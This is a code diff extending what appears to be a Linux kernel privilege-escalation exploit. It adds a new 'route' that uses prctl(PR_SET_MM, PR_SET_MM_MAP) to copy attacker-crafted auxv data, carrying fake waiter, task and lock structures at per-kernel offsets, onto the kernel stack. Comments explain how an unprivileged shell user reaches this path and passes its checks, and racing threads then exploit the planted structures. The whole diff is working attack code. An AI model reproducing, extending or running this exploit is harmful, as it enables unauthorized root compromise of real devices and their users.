@@ -2,6 +2,13 @@
 #include <time.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
+#include <sys/prctl.h>
+#ifndef PR_SET_MM
+#define PR_SET_MM 35
+#endif
+#ifndef PR_SET_MM_MAP
+#define PR_SET_MM_MAP 28
+#endif
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -716,6 +723,62 @@ void do_kernel5_fake_lock_route(void) {
   atomic_store(&punch_consume_go, 0);
   while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
   close(fd);
+  if (ret == 0 || atomic_load(&consumer_success) > 0) {
+    route_last_step = 0; route_last_errno = 0;
+  }
+}
+
+/* prctl(PR_SET_MM, PR_SET_MM_MAP) route: prctl_set_mm_map copies the user auxv
+ * into a 0x190-byte stack local (user_auxv[AT_VECTOR_SIZE]). PR_SET_MM_MAP
+ * dispatches before the CAP_SYS_RESOURCE check and prctl_set_mm_map has no gate
+ * of its own, so shell uid reaches it. The option struct itself must pass
+ * validate_prctl_map_addr, which an all-zero map does while soft-dirty is
+ * clear, and exe_fd must stay -1 or it needs checkpoint/restore capability.
+ *
+ * Geometry comes from the entry: auxv buffer offset, its size, and the payload
+ * offset that lands task/lock, all measured per kernel. */
+void do_prctl_mm_map_route(void) {
+  if (!active_offsets || !active_offsets->prctl_auxv_off ||
+      !active_offsets->prctl_auxv_size || !active_offsets->prctl_waiter_off) {
+    route_last_step = 70;
+    route_last_errno = 0;
+    return;
+  }
+  size_t size = active_offsets->prctl_auxv_size;
+  unsigned char payload[size];
+  memset(payload, 0, sizeof(payload));
+  write_waiter_words(payload, active_offsets->prctl_waiter_off,
+                     fake_parent, fake_right, fake_left, fake_task, fake_lock,
+                     (int)active_offsets->compact_waiter);
+  pr_info("prctl route enter page=%016zx fake_lock=%016zx fake_task=%016zx "
+          "waiter_off=%#x auxv_off=%#x size=%#x\n",
+          page_base, fake_lock, fake_task, active_offsets->prctl_waiter_off,
+          active_offsets->prctl_auxv_off, active_offsets->prctl_auxv_size);
+
+  struct prctl_mm_map_arg {
+    uint64_t start_code, end_code, start_data, end_data;
+    uint64_t start_brk, brk, start_stack;
+    uint64_t arg_start, arg_end, env_start, env_end;
+    uint64_t auxv;
+    uint32_t auxv_size, exe_fd;
+  } map;
+  memset(&map, 0, sizeof(map));
+  map.auxv = (uint64_t)(uintptr_t)payload;
+  map.auxv_size = (uint32_t)size;
+  map.exe_fd = 0xffffffffu;
+
+  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
+  errno = 0;
+  int ret = prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0);
+  route_last_step = 72; route_last_errno = errno;
+  atomic_store(&punch_consume_go, 1);
+  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0;
+       spin++)
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight))
+    __asm__ volatile("yield" ::: "memory");
   if (ret == 0 || atomic_load(&consumer_success) > 0) {
     route_last_step = 0; route_last_errno = 0;
   }
